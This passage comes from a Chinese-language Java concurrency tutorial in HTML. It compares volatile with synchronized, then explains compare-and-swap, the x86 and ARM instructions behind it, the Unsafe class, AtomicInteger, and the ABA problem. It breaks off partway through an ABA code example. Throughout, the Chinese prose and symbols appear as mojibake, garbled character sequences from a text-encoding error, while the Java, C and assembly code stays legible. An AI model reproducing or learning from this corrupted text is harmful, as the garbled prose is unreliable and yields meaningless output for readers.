<li>âœ… <strong>ç‹¬ç«‹è§‚å¯Ÿ</strong>ï¼šå‘å¸ƒè§‚å¯Ÿç»“æœç»™å…¶ä»–çº¿ç¨‹</li>
</ul>
<p><strong>synchronizedé€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… <strong>éœ€è¦åŸå­æ€§</strong>ï¼šå¤šæ­¥éª¤æ“ä½œéœ€è¦åŸå­æ‰§è¡Œ</li>
<li>âœ… <strong>éœ€è¦äº’æ–¥</strong>ï¼šåŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œ</li>
<li>âœ… <strong>å¤æ‚åŒæ­¥</strong>ï¼šéœ€è¦æ›´å¤æ‚çš„åŒæ­¥é€»è¾‘</li>
</ul>
<p><strong>é€‰æ‹©å»ºè®®ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">åªéœ€è¦å¯è§æ€§ï¼Ÿ
  â”œâ”€ æ˜¯ â†’ ä½¿ç”¨<span class="hljs-keyword">volatile</span> âœ…
  â””â”€ å¦ â†’ éœ€è¦åŸå­æ€§ï¼Ÿ
       â”œâ”€ æ˜¯ â†’ ä½¿ç”¨<span class="hljs-keyword">synchronized</span>æˆ–åŸå­ç±»
       â””â”€ å¦ â†’ æ ¹æ®å…·ä½“æƒ…å†µé€‰æ‹©

è¯»å¤šå†™å°‘ï¼Ÿ
  â”œâ”€ æ˜¯ â†’ <span class="hljs-keyword">volatile</span> + CAS âœ…
  â””â”€ å¦ â†’ <span class="hljs-keyword">synchronized</span>

ç®€å•æ ‡å¿—ï¼Ÿ
  â”œâ”€ æ˜¯ â†’ <span class="hljs-keyword">volatile</span> âœ…
  â””â”€ å¦ â†’ <span class="hljs-keyword">synchronized</span>
</code></pre>
<p><strong>å®é™…å»ºè®®ï¼š</strong></p>
<ul>
<li><strong>çŠ¶æ€æ ‡å¿—</strong>ï¼šä¼˜å…ˆä½¿ç”¨volatile</li>
<li><strong>è®¡æ•°å™¨ç­‰</strong>ï¼šä½¿ç”¨åŸå­ç±»ï¼ˆAtomicIntegerï¼‰</li>
<li><strong>å¤æ‚åŒæ­¥</strong>ï¼šä½¿ç”¨synchronized</li>
<li><strong>è¯»å¤šå†™å°‘</strong>ï¼švolatile + CAS</li>
</ul>
<hr/>
<h2 data-id="heading-97">ç¬¬äº”ç«  CASï¼ˆCompare-And-Swapï¼‰</h2>
<h3 data-id="heading-98">5.1 CASåŸç†</h3>
<h4 data-id="heading-99">CASæ“ä½œçš„å®šä¹‰</h4>
<p>**CASï¼ˆCompare-And-Swapï¼‰**æ˜¯ä¸€ç§æ— é”çš„åŸå­æ“ä½œï¼Œç”¨äºå®ç°å¤šçº¿ç¨‹åŒæ­¥ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯CASï¼Ÿ</strong></p>
<ul>
<li>CASæ˜¯"æ¯”è¾ƒå¹¶äº¤æ¢"çš„æ„æ€</li>
<li>å®ƒæ˜¯ä¸€ç§ä¹è§‚é”çš„å®ç°æ–¹å¼</li>
<li>ä¸åƒæ‚²è§‚é”ï¼ˆå¦‚synchronizedï¼‰å…ˆè·å–é”å†æ“ä½œï¼ŒCASå…ˆå°è¯•æ“ä½œï¼Œå¤±è´¥äº†å†é‡è¯•</li>
</ul>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>æƒ³è±¡ä¸€ä¸ªå‚¨ç‰©æŸœï¼Œä½ æƒ³æŠŠé‡Œé¢çš„ä¸œè¥¿æ¢æ‰</li>
<li>CASå°±æ˜¯ï¼šå…ˆçœ‹çœ‹é‡Œé¢æ˜¯ä¸æ˜¯ä½ æœŸæœ›çš„ä¸œè¥¿ï¼ˆæ¯”è¾ƒï¼‰</li>
<li>å¦‚æœæ˜¯ï¼Œå°±æ¢æˆæ–°çš„ï¼ˆäº¤æ¢ï¼‰</li>
<li>å¦‚æœä¸æ˜¯ï¼Œè¯´æ˜è¢«åˆ«äººæ¢è¿‡äº†ï¼Œé‡æ–°è¯»å–å†å°è¯•</li>
</ul>
<p><strong>CASæ“ä½œåŒ…å«ä¸‰ä¸ªæ“ä½œæ•°ï¼š</strong></p>
<ul>
<li><strong>å†…å­˜ä½ç½®ï¼ˆVï¼‰</strong>ï¼šè¦æ›´æ–°çš„å˜é‡ï¼ˆå°±åƒå‚¨ç‰©æŸœçš„ä½ç½®ï¼‰</li>
<li><strong>é¢„æœŸå€¼ï¼ˆAï¼‰</strong>ï¼šæœŸæœ›çš„æ—§å€¼ï¼ˆä½ æœŸæœ›çœ‹åˆ°çš„æ—§ä¸œè¥¿ï¼‰</li>
<li><strong>æ–°å€¼ï¼ˆBï¼‰</strong>ï¼šè¦è®¾ç½®çš„æ–°å€¼ï¼ˆä½ æƒ³æ”¾è¿›å»çš„æ–°ä¸œè¥¿ï¼‰</li>
</ul>
<p><strong>CASæ“ä½œé€»è¾‘ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è¯»å–å½“å‰å€¼ V
<span class="hljs-bullet">2.</span> æ¯”è¾ƒï¼šV æ˜¯å¦ç­‰äºé¢„æœŸå€¼ Aï¼Ÿ
<span class="hljs-bullet">   -</span> å¦‚æœç›¸ç­‰ â†’ å°† V æ›´æ–°ä¸º Bï¼ˆäº¤æ¢æˆåŠŸï¼‰
<span class="hljs-bullet">   -</span> å¦‚æœä¸ç›¸ç­‰ â†’ ä¸æ›´æ–°ï¼ˆäº¤æ¢å¤±è´¥ï¼Œå¯èƒ½è¢«åˆ«äººæ”¹è¿‡äº†ï¼‰
<span class="hljs-bullet">3.</span> è¿”å›æ“ä½œç»“æœ
</code></pre>
<p><strong>ä¼ªä»£ç ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwap</span><span class="hljs-params">(<span class="hljs-type">int</span> V, <span class="hljs-type">int</span> A, <span class="hljs-type">int</span> B)</span> {
    <span class="hljs-keyword">if</span> (V == A) {        <span class="hljs-comment">// æ¯”è¾ƒï¼šå½“å‰å€¼æ˜¯å¦ç­‰äºé¢„æœŸå€¼ï¼Ÿ</span>
        V = B;           <span class="hljs-comment">// äº¤æ¢ï¼šæ›´æ–°ä¸ºæ–°å€¼</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;     <span class="hljs-comment">// æˆåŠŸ</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        <span class="hljs-comment">// å¤±è´¥ï¼Œè¿”å›å½“å‰å€¼</span>
}
</code></pre>
<p><strong>å®é™…è¿”å›å€¼ï¼š</strong></p>
<ul>
<li>æœ‰äº›CASå®ç°è¿”å›booleanï¼ˆæˆåŠŸ/å¤±è´¥ï¼‰</li>
<li>æœ‰äº›è¿”å›æ—§å€¼ï¼ˆè®©ä½ çŸ¥é“å½“å‰çš„å®é™…å€¼ï¼‰</li>
</ul>
<h4 data-id="heading-100">CASçš„åŸå­æ€§ä¿è¯</h4>
<p><strong>ä¸ºä»€ä¹ˆCASæ˜¯åŸå­çš„ï¼Ÿ</strong></p>
<p>CASä¹‹æ‰€ä»¥æ˜¯åŸå­æ“ä½œï¼Œæ˜¯å› ä¸º<strong>CPUç›´æ¥æä¾›äº†åŸå­æ€§çš„CASæŒ‡ä»¤</strong>ã€‚è¿™ä¸æ˜¯Javaè¯­è¨€å±‚é¢çš„ç‰¹æ€§ï¼Œè€Œæ˜¯ç¡¬ä»¶å±‚é¢çš„æ”¯æŒã€‚</p>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ol>
<li><strong>CPUæŒ‡ä»¤çº§åˆ«</strong>ï¼šCASæ˜¯CPUçš„ä¸€æ¡æŒ‡ä»¤ï¼Œä¸€æ¡æŒ‡ä»¤çš„æ‰§è¡Œæ˜¯ä¸å¯åˆ†å‰²çš„</li>
<li><strong>ä¸ä¼šè¢«ä¸­æ–­</strong>ï¼šåœ¨æ‰§è¡ŒCASæŒ‡ä»¤æœŸé—´ï¼Œä¸ä¼šè¢«å…¶ä»–çº¿ç¨‹æˆ–æ“ä½œä¸­æ–­</li>
<li><strong>ç¡¬ä»¶ä¿è¯</strong>ï¼šè¿™æ˜¯ç¡¬ä»¶å±‚é¢çš„ä¿è¯ï¼Œæ¯”è½¯ä»¶å±‚é¢çš„é”æ›´åº•å±‚ã€æ›´é«˜æ•ˆ</li>
</ol>
<p><strong>åŸå­æ€§çš„é‡è¦æ€§ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ éåŸå­æ“ä½œï¼ˆä¸å®‰å…¨ï¼Œæœ‰ç«æ€æ¡ä»¶ï¼‰</span>
<span class="hljs-keyword">if</span> (value == expected) {
    value = newValue;  <span class="hljs-comment">// è¿™ä¸¤æ­¥ä¸æ˜¯åŸå­çš„</span>
    <span class="hljs-comment">// é—®é¢˜ï¼šåœ¨æ£€æŸ¥å’Œèµ‹å€¼ä¹‹é—´ï¼Œvalueå¯èƒ½è¢«å…¶ä»–çº¿ç¨‹ä¿®æ”¹</span>
}

<span class="hljs-comment">// âœ… CASåŸå­æ“ä½œï¼ˆå®‰å…¨ï¼‰</span>
compareAndSwap(value, expected, newValue);  
<span class="hljs-comment">// ä¸€æ­¥å®Œæˆï¼Œä¸ä¼šè¢«ä¸­æ–­ï¼ŒåŸå­æ€§ä¿è¯</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆæ™®é€šæ“ä½œä¸æ˜¯åŸå­çš„ï¼Ÿ</strong></p>
<ul>
<li>æ™®é€šæ“ä½œåŒ…å«å¤šä¸ªæ­¥éª¤ï¼ˆè¯»å–ã€æ¯”è¾ƒã€å†™å…¥ï¼‰</li>
<li>åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œè¿™äº›æ­¥éª¤ä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</li>
<li>å¯¼è‡´æ•°æ®ä¸ä¸€è‡´é—®é¢˜</li>
</ul>
<h4 data-id="heading-101">CPUåŸè¯­æ”¯æŒ</h4>
<p><strong>ä¸åŒCPUæ¶æ„çš„CASå®ç°ï¼š</strong></p>
<p><strong>x86/x64æ¶æ„ï¼ˆIntel/AMDï¼‰ï¼š</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">; CMPXCHGæŒ‡ä»¤ï¼ˆCompare and Exchangeï¼‰
CMPXCHG dest, src
; åŠŸèƒ½ï¼šæ¯”è¾ƒEAXå¯„å­˜å™¨ä¸­çš„å€¼å’Œdestï¼Œå¦‚æœç›¸ç­‰ï¼Œå°†srcå†™å…¥dest
; è¿™æ˜¯x86æ¶æ„æä¾›çš„åŸå­æŒ‡ä»¤
</code></pre>
<p><strong>ARMæ¶æ„ï¼ˆæ‰‹æœº/åµŒå…¥å¼è®¾å¤‡ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">; LDREX/STREXæŒ‡ä»¤å¯¹ï¼ˆLoad-Exclusive/Store-Exclusiveï¼‰
LDREX R1, [R0]        ; åŠ è½½å¹¶ç‹¬å è®¿é—®
CMP R1, R2            ; æ¯”è¾ƒ
STREXEQ R3, R4, [R0]  ; æ¡ä»¶å­˜å‚¨ï¼ˆå¦‚æœç‹¬å çŠ¶æ€è¿˜åœ¨ï¼‰
; é€šè¿‡ç‹¬å è®¿é—®æœºåˆ¶å®ç°åŸå­æ“ä½œ
</code></pre>
<p><strong>Javaä¸­çš„CASï¼š</strong></p>
<p>Javaé€šè¿‡<code>Unsafe</code>ç±»è°ƒç”¨åº•å±‚CPUæŒ‡ä»¤ï¼Œå¯¹å¼€å‘è€…æ¥è¯´æ˜¯é€æ˜çš„ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Unsafeç±»æä¾›CASæ–¹æ³•ï¼ˆåº•å±‚è°ƒç”¨CPUæŒ‡ä»¤ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapInt</span><span class="hljs-params">(
    Object o,     // å¯¹è±¡
    <span class="hljs-type">long</span> offset,  // å­—æ®µåç§»é‡ï¼ˆå†…å­˜åœ°å€ï¼‰
    <span class="hljs-type">int</span> expected, // é¢„æœŸå€¼
    <span class="hljs-type">int</span> x         // æ–°å€¼
)</span>;
<span class="hljs-comment">// è¿™ä¸ªæ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨CPUçš„CASæŒ‡ä»¤</span>
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>Javaä»£ç  â†’ Unsafeç±» â†’ JVM â†’ CPUæŒ‡ä»¤</li>
<li>æœ€ç»ˆæ‰§è¡Œçš„æ˜¯CPUæä¾›çš„åŸå­æŒ‡ä»¤</li>
<li>å¼€å‘è€…ä¸éœ€è¦å…³å¿ƒåº•å±‚å®ç°ç»†èŠ‚</li>
</ul>
<h3 data-id="heading-102">5.2 CASçš„å®ç°</h3>
<h4 data-id="heading-103">Unsafeç±»</h4>
<p><strong>Unsafeç±»æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p><code>Unsafe</code>ç±»æ˜¯Javaæä¾›çš„ä¸€ä¸ª"åé—¨"ç±»ï¼Œç”¨äºæ‰§è¡Œä¸€äº›ä¸å®‰å…¨çš„åº•å±‚æ“ä½œã€‚å®ƒçš„åå­—å°±è¯´æ˜äº†å®ƒçš„ç‰¹æ€§â€”â€”unsafeï¼ˆä¸å®‰å…¨ï¼‰ã€‚</p>
<p><strong>Unsafeç±»çš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>âœ… <strong>ç›´æ¥æ“ä½œå†…å­˜</strong>ï¼šå¯ä»¥åƒCè¯­è¨€ä¸€æ ·ç›´æ¥è¯»å†™å†…å­˜</li>
<li>âœ… <strong>æä¾›CASæ–¹æ³•</strong>ï¼šcompareAndSwapIntã€compareAndSwapLongç­‰</li>
<li>âœ… <strong>ç»•è¿‡å®‰å…¨æ£€æŸ¥</strong>ï¼šå¯ä»¥åšä¸€äº›æ­£å¸¸æƒ…å†µä¸‹ä¸å…è®¸çš„æ“ä½œ</li>
<li>âš ï¸ <strong>ä¸æ¨èç›´æ¥ä½¿ç”¨</strong>ï¼šå±äº<code>sun.misc</code>åŒ…ï¼Œä¸æ˜¯å…¬å¼€APIï¼Œå¯èƒ½åœ¨ä¸åŒJDKç‰ˆæœ¬ä¸­å˜åŒ–</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆå«Unsafeï¼Ÿ</strong></p>
<ul>
<li>å› ä¸ºå®ƒç»•è¿‡äº†Javaçš„å®‰å…¨æ£€æŸ¥æœºåˆ¶</li>
<li>ä½¿ç”¨ä¸å½“å¯èƒ½å¯¼è‡´JVMå´©æºƒ</li>
<li>åªæœ‰ç³»ç»Ÿä»£ç ï¼ˆå¦‚JUCåŒ…ï¼‰æ‰åº”è¯¥ä½¿ç”¨</li>
</ul>
<p><strong>è·å–Unsafeå®ä¾‹ï¼ˆä»…äº†è§£ï¼Œä¸è¦ç›´æ¥ä½¿ç”¨ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âš ï¸ æ³¨æ„ï¼šè¿™åªæ˜¯æ¼”ç¤ºï¼Œç”Ÿäº§ç¯å¢ƒä¸è¦è¿™æ ·åš</span>
<span class="hljs-keyword">import</span> sun.misc.Unsafe;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;

<span class="hljs-comment">// é€šè¿‡åå°„è·å–Unsafeå®ä¾‹</span>
<span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();

<span class="hljs-comment">// æ­£å¸¸å¼€å‘ä¸­ï¼Œåº”è¯¥ä½¿ç”¨AtomicIntegerç­‰å°è£…å¥½çš„ç±»</span>
<span class="hljs-comment">// è€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨Unsafe</span>
</code></pre>
<p><strong>å®é™…å¼€å‘å»ºè®®ï¼š</strong></p>
<ul>
<li>âŒ <strong>ä¸è¦ç›´æ¥ä½¿ç”¨Unsafeç±»</strong></li>
<li>âœ… <strong>ä½¿ç”¨AtomicIntegerã€AtomicLongç­‰å°è£…å¥½çš„åŸå­ç±»</strong></li>
<li>âœ… <strong>è¿™äº›åŸå­ç±»å†…éƒ¨å·²ç»ä½¿ç”¨äº†Unsafeï¼Œæä¾›å®‰å…¨çš„API</strong></li>
</ul>
<h4 data-id="heading-104">compareAndSwapInt/Long/Objectæ–¹æ³•</h4>
<p><strong>Unsafeæä¾›çš„CASæ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é’ˆå¯¹intç±»å‹çš„CAS</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapInt</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> expected, <span class="hljs-type">int</span> x)</span>;

<span class="hljs-comment">// é’ˆå¯¹longç±»å‹çš„CAS</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapLong</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">long</span> expected, <span class="hljs-type">long</span> x)</span>;

<span class="hljs-comment">// é’ˆå¯¹å¯¹è±¡å¼•ç”¨çš„CAS</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwapObject</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, Object expected, Object x)</span>;
</code></pre>
<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>Object o</code>ï¼šåŒ…å«è¦æ›´æ–°å­—æ®µçš„å¯¹è±¡</li>
<li><code>long offset</code>ï¼šå­—æ®µåœ¨å¯¹è±¡ä¸­çš„å†…å­˜åç§»é‡ï¼ˆå¯ä»¥ç†è§£ä¸ºå­—æ®µçš„"åœ°å€"ï¼‰</li>
<li><code>expected</code>ï¼šæœŸæœ›çš„æ—§å€¼</li>
<li><code>x</code>ï¼šè¦è®¾ç½®çš„æ–°å€¼</li>
</ul>
<p><strong>å®é™…ä½¿ç”¨ï¼ˆç®€åŒ–ç¤ºä¾‹ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®é™…å¼€å‘ä¸­ï¼Œä¸éœ€è¦è‡ªå·±å®ç°ï¼Œç›´æ¥ä½¿ç”¨AtomicIntegerå³å¯</span>
<span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// incrementAndGetå†…éƒ¨å°±æ˜¯ä½¿ç”¨CASå®ç°çš„</span>
count.incrementAndGet();  

<span class="hljs-comment">// ç­‰ä»·äºä»¥ä¸‹é€»è¾‘ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</span>
<span class="hljs-comment">// do {</span>
<span class="hljs-comment">//     current = count.get();</span>
<span class="hljs-comment">//     next = current + 1;</span>
<span class="hljs-comment">// } while (!count.compareAndSet(current, next));</span>
</code></pre>
<p><strong>æ–¹æ³•å¯¹æ¯”ï¼š</strong></p>
<ul>
<li><strong>compareAndSwapInt</strong>ï¼šç”¨äºintç±»å‹ï¼ˆ32ä½ï¼‰</li>
<li><strong>compareAndSwapLong</strong>ï¼šç”¨äºlongç±»å‹ï¼ˆ64ä½ï¼‰</li>
<li><strong>compareAndSwapObject</strong>ï¼šç”¨äºå¯¹è±¡å¼•ç”¨</li>
</ul>
<h4 data-id="heading-105">CASçš„åº•å±‚å®ç°ï¼ˆäº†è§£å³å¯ï¼‰</h4>
<p><strong>x86æ¶æ„ä¸‹çš„å®ç°åŸç†ï¼š</strong></p>
<p>JVMçš„HotSpotè™šæ‹Ÿæœºåœ¨x86æ¶æ„ä¸‹ï¼ŒCASæœ€ç»ˆä¼šç¼–è¯‘æˆCPUæŒ‡ä»¤ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// HotSpotæºç ï¼ˆç®€åŒ–ç‰ˆï¼Œäº†è§£å³å¯ï¼‰</span>
<span class="hljs-keyword">inline</span> jint <span class="hljs-title function_">Atomic::cmpxchg</span><span class="hljs-params">(...)</span> {
    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(
        <span class="hljs-string">"lock cmpxchgl %1,(%3)"</span>  <span class="hljs-comment">// å…³é”®ï¼šlockå‰ç¼€ + CMPXCHGæŒ‡ä»¤</span>
        ...
    )</span>;
}
</code></pre>
<p><strong>å…³é”®ç‚¹è§£æï¼š</strong></p>
<ol>
<li>
<p><strong>lockå‰ç¼€</strong>ï¼š</p>
<ul>
<li>é”å®šCPUæ€»çº¿æˆ–ç¼“å­˜è¡Œ</li>
<li>ç¡®ä¿åªæœ‰ä¸€ä¸ªCPUæ ¸å¿ƒèƒ½æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤</li>
<li>ä¿è¯åŸå­æ€§</li>
</ul>
</li>
<li>
<p><strong>cmpxchglæŒ‡ä»¤</strong>ï¼š</p>
<ul>
<li>x86æ¶æ„çš„æ¯”è¾ƒå¹¶äº¤æ¢æŒ‡ä»¤</li>
<li>ä¸€æ¡æŒ‡ä»¤å®Œæˆæ¯”è¾ƒå’Œäº¤æ¢</li>
<li>ç¡¬ä»¶çº§åˆ«çš„åŸå­æ“ä½œ</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜å±éšœ</strong>ï¼š</p>
<ul>
<li>ä¿è¯å¯è§æ€§ï¼ˆå…¶ä»–CPUèƒ½çœ‹åˆ°æ›´æ–°ï¼‰</li>
<li>é˜²æ­¢æŒ‡ä»¤é‡æ’åº</li>
</ul>
</li>
</ol>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>Javaä»£ç  â†’ JVM â†’ CPUæŒ‡ä»¤ï¼ˆlock cmpxchglï¼‰</li>
<li>ä¸€æ¡CPUæŒ‡ä»¤å®Œæˆï¼Œä¸ä¼šè¢«ä¸­æ–­</li>
<li>ç¡¬ä»¶ä¿è¯åŸå­æ€§ï¼Œéå¸¸é«˜æ•ˆ</li>
</ul>
<h3 data-id="heading-106">5.3 CASçš„ä¼˜ç¼ºç‚¹</h3>
<h4 data-id="heading-107">ä¼˜ç‚¹ï¼šæ— é”ã€é«˜æ€§èƒ½</h4>
<p><strong>æ— é”çš„ä¼˜åŠ¿ï¼š</strong></p>
<ol>
<li>
<p><strong>é¿å…çº¿ç¨‹é˜»å¡å’Œå”¤é†’çš„å¼€é”€</strong></p>
<ul>
<li>synchronizedä¼šè®©çº¿ç¨‹è¿›å…¥é˜»å¡çŠ¶æ€ï¼Œéœ€è¦æ“ä½œç³»ç»Ÿå”¤é†’</li>
<li>CASå¤±è´¥ååªæ˜¯è‡ªæ—‹é‡è¯•ï¼Œçº¿ç¨‹ä¸ä¼šé˜»å¡</li>
<li>å‡å°‘äº†ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€</li>
</ul>
</li>
<li>
<p><strong>é¿å…æ­»é”</strong></p>
<ul>
<li>CASä¸éœ€è¦è·å–é”ï¼Œä¸ä¼šå‡ºç°æ­»é”é—®é¢˜</li>
<li>éå¸¸é€‚åˆåœ¨é«˜å¹¶å‘åœºæ™¯ä½¿ç”¨</li>
</ul>
</li>
<li>
<p><strong>é€‚åˆä½ç«äº‰åœºæ™¯</strong></p>
<ul>
<li>å½“å¤šä¸ªçº¿ç¨‹ç«äº‰ä¸æ¿€çƒˆæ—¶ï¼ŒCASæ€§èƒ½éå¸¸å¥½</li>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹CASéƒ½èƒ½æˆåŠŸï¼Œä¸éœ€è¦é‡è¯•</li>
</ul>
</li>
</ol>
<p><strong>æ€§èƒ½å¯¹æ¯”ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ synchronizedæ–¹å¼ï¼ˆæœ‰é”ï¼Œä¼šé˜»å¡ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// è·å–é”ï¼Œå¯èƒ½é˜»å¡ç­‰å¾…</span>
}

<span class="hljs-comment">// âœ… CASæ–¹å¼ï¼ˆæ— é”ï¼Œè‡ªæ—‹é‡è¯•ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  
    <span class="hljs-comment">// å†…éƒ¨å®ç°ï¼šè‡ªæ—‹é‡è¯•ï¼Œä¸é˜»å¡</span>
    <span class="hljs-comment">// do {</span>
    <span class="hljs-comment">//     current = count.get();</span>
    <span class="hljs-comment">// } while (!count.compareAndSet(current, current + 1));</span>
}
</code></pre>
<p><strong>æ€§èƒ½å¯¹æ¯”æ€»ç»“ï¼š</strong></p>

























<table><thead><tr><th>åœºæ™¯</th><th>CAS</th><th>synchronized</th></tr></thead><tbody><tr><td><strong>ä½ç«äº‰</strong></td><td>âœ… æ€§èƒ½å¾ˆå¥½ï¼ˆå¤§å¤šæ•°æˆåŠŸï¼Œå¾ˆå°‘é‡è¯•ï¼‰</td><td>âš ï¸ æ€§èƒ½ç¨å·®ï¼ˆæœ‰é”å¼€é”€ï¼‰</td></tr><tr><td><strong>é«˜ç«äº‰</strong></td><td>âš ï¸ æ€§èƒ½ä¸‹é™ï¼ˆå¤§é‡è‡ªæ—‹é‡è¯•ï¼ŒCPUæ¶ˆè€—é«˜ï¼‰</td><td>âœ… æ€§èƒ½æ›´å¥½ï¼ˆé˜»å¡ç­‰å¾…ï¼ŒèŠ‚çœCPUï¼‰</td></tr><tr><td><strong>æ¨èåœºæ™¯</strong></td><td>è¯»å¤šå†™å°‘ã€ç«äº‰ä¸æ¿€çƒˆ</td><td>ç«äº‰æ¿€çƒˆã€éœ€è¦äº’æ–¥è®¿é—®</td></tr></tbody></table>
<h4 data-id="heading-108">ç¼ºç‚¹ï¼šABAé—®é¢˜ã€è‡ªæ—‹å¼€é”€ã€åªèƒ½ä¿è¯ä¸€ä¸ªå˜é‡çš„åŸå­æ€§</h4>
<h5 data-id="heading-109">ABAé—®é¢˜</h5>
<p><strong>ä»€ä¹ˆæ˜¯ABAé—®é¢˜ï¼Ÿ</strong></p>
<p>ABAé—®é¢˜æ˜¯æŒ‡ï¼šå€¼ä»Aå˜æˆBï¼Œå†å˜å›Aï¼ŒCASä»ç„¶è®¤ä¸ºå€¼æ²¡æœ‰è¢«ä¿®æ”¹è¿‡ã€‚</p>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>ä½ ç¦»å¼€æ—¶çœ‹åˆ°æ¡Œä¸Šæœ‰ä¸ªè‹¹æœï¼ˆAï¼‰</li>
<li>ä½ å›æ¥æ—¶æ¡Œä¸Šè¿˜æ˜¯è‹¹æœï¼ˆAï¼‰</li>
<li>ä½†å®é™…ä¸Šè¿™ä¸ªè‹¹æœå¯èƒ½è¢«æ¢è¿‡äº†ï¼ˆåŸæ¥çš„è¢«åƒäº†ï¼Œæ”¾äº†ä¸ªæ–°çš„ï¼‰</li>
<li>CASåªæ£€æŸ¥å€¼æ˜¯å¦ç›¸åŒï¼Œæ— æ³•å‘ç°"è¢«æ¢è¿‡"è¿™ä¸ªäº‹å®</li>
</ul>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile">æ—¶é—´çº¿ï¼š
<span class="hljs-section">T1: çº¿ç¨‹1è¯»å–å€¼ = A</span>
<span class="hljs-section">T2: çº¿ç¨‹2ä¿®æ”¹å€¼ï¼šA -&gt; B</span>
<span class="hljs-section">T3: çº¿ç¨‹2ä¿®æ”¹å€¼ï¼šB -&gt; Aï¼ˆåˆæ”¹å›æ¥äº†ï¼‰</span>
<span class="hljs-section">T4: çº¿ç¨‹1æ‰§è¡ŒCAS(A, C)</span>
    ç»“æœï¼šCASæˆåŠŸï¼ä½†å®é™…ä¸Šå€¼å·²ç»è¢«ä¿®æ”¹è¿‡äº†
</code></pre>
<p><strong>ç¤ºä¾‹ä»£ç ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>);

<span class="hljs-comment">// çº¿ç¨‹1ï¼šå‡†å¤‡å°†Aæ”¹ä¸ºC</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
